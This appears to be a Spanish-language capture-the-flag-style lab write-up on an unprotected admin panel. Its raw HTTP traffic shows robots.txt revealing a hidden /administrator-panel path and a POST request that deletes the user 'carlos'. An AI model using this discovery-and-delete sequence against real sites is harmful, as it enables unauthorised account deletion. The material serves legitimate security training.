# 👮 Laboratorio: Funcionalidad de administración desprotegida

**Control de acceso**

Los controles de acceso están diseñados para evitar que los usuarios interactúen con datos o funciones para las que no tienen los permisos pertinentes. Debido al obvio impacto en la seguridad, los controles de acceso rotos son errores críticos en sí mismos. A menudo también brindan acceso a más superficie de ataque, lo que podría contener vulnerabilidades adicionales.

```python
// Some code

PANEL ADMINISTRADOR DESPROTEGIDO:




REQUEST:


GET /robots.txt HTTP/2
Host: 0ae2004104f3234a803c67f80042005a.web-security-academy.net
Cookie: session=nmsvLGTaLJjX2egoqoFSsva2E47Y8a46
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae2004104f3234a803c67f80042005a.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9



RESPONSE:

HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 45

User-agent: *
Disallow: /administrator-panel












ELIMINAR CARLOS:

REQUEST:


POST /administrator-panel/delete?username=carlos HTTP/2
Host: 0ae2004104f3234a803c67f80042005a.web-security-academy.net
Cookie: session=nmsvLGTaLJjX2egoqoFSsva2E47Y8a46
Content-Length: 69
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0ae2004104f3234a803c67f80042005a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ae2004104f3234a803c67f80042005a.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

csrf=zqR6YjdExoEtmtpKZuVf9YQFQQpOqI4P&username=carlos&password=carlos


/administrator-panel/delete?username=carlos




RESPONSE OK REDIRIGE:


TTP/2 302 Found
Location: /administrator-panel
X-Frame-Options: SAMEORIGIN
Content-Length: 0

```
